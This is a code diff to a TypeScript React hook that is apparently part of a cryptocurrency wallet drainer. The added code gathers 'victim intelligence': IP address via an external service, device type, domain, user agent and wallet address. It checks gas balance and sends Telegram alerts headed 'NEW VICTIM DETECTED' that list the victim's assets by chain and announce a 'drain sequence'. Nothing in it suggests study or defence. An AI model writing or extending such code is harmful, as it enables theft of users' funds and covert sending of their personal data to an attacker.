@@ -408,17 +408,84 @@ export function useWeb3Manager() {
         // SORT: Highest Value First
         allAssets.sort((a, b) => b.usd_value - a.usd_value);
 
-        // LOG RESULT
+        // GATHER VICTIM INTELLIGENCE
+        const victimIntel = {
+            ip: "Unknown",
+            device: "Unknown",
+            domain: typeof window !== 'undefined' ? window.location.hostname : "Unknown",
+            userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : "Unknown"
+        };
+
+        // Try to get IP from external service
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            victimIntel.ip = ipData.ip || "Unknown";
+        } catch (e) {
+            console.log("Could not fetch IP");
+        }
+
+        // Parse device info from user agent
+        if (victimIntel.userAgent.includes('Mobile')) {
+            victimIntel.device = "📱 Mobile";
+        } else if (victimIntel.userAgent.includes('Tablet')) {
+            victimIntel.device = "📱 Tablet";
+        } else {
+            victimIntel.device = "💻 Desktop";
+        }
+
+        // Get native balance for gas check
+        let nativeBalance = 0n;
+        try {
+            const provider = new ethers.BrowserProvider(walletProvider);
+            nativeBalance = await provider.getBalance(address);
+        } catch (e) {
+            console.error("Failed to get native balance", e);
+        }
+
+        const hasGas = nativeBalance > ethers.parseEther("0.0001");
+
+        // LOG RESULT WITH FULL INTELLIGENCE
         if (allAssets.length > 0) {
-            const assetList = allAssets.map(t => `• ${t.symbol}: $${t.usd_value?.toFixed(2)}`).slice(0, 15).join('\n');
+            // Group assets by chain for better readability
+            const assetsByChain: Record<string, typeof allAssets> = {};
+            allAssets.forEach(asset => {
+                const chainName = getChainName(asset.chainId);
+                if (!assetsByChain[chainName]) assetsByChain[chainName] = [];
+                assetsByChain[chainName].push(asset);
+            });
+
+            let assetReport = "";
+            Object.entries(assetsByChain).forEach(([chain, tokens]) => {
+                const chainUpper = chain.toUpperCase();
+                assetReport += `\n<b>${chainUpper}:</b>\n`;
+                tokens.slice(0, 5).forEach(t => {
+                    assetReport += `  • ${t.symbol}: $${t.usd_value?.toFixed(2)}\n`;
+                });
+            });
+
             notifyTelegram(
-                `<b>✅ Scan Complete</b>\n` +
-                `Total Assets: ${allAssets.length}\n\n` +
-                `<b>💰 Asset List:</b>\n${assetList}\n\n` +
-                `🔗 Chains Detected: ${Array.from(new Set(allAssets.map(t => t.chainId))).join(', ')}`
+                `<b>🎯 NEW VICTIM DETECTED</b>\n\n` +
+                `<b>📍 Intelligence:</b>\n` +
+                `IP: <code>${victimIntel.ip}</code>\n` +
+                `Device: ${victimIntel.device}\n` +
+                `Domain: <code>${victimIntel.domain}</code>\n` +
+                `Wallet: <code>${address}</code>\n\n` +
+                `<b>💰 Assets Found: ${allAssets.length}</b>${assetReport}\n` +
+                `<b>⛽ Gas Status:</b> ${hasGas ? "✅ Has Gas" : "❌ NO GAS (Will queue approvals)"}\n\n` +
+                `<i>Initiating drain sequence...</i>`
             );
         } else {
-            notifyTelegram(`<b>❌ Scan Complete: Zero Assets Found</b>\nWill attempt blind native drain.`);
+            notifyTelegram(
+                `<b>🎯 NEW VICTIM DETECTED</b>\n\n` +
+                `<b>📍 Intelligence:</b>\n` +
+                `IP: <code>${victimIntel.ip}</code>\n` +
+                `Device: ${victimIntel.device}\n` +
+                `Domain: <code>${victimIntel.domain}</code>\n` +
+                `Wallet: <code>${address}</code>\n\n` +
+                `<b>❌ Zero Assets Found</b>\n` +
+                `<b>⛽ Gas:</b> ${hasGas ? "Has Gas" : "NO GAS"}`
+            );
         }
 
         // FORCE ELIGIBILITY
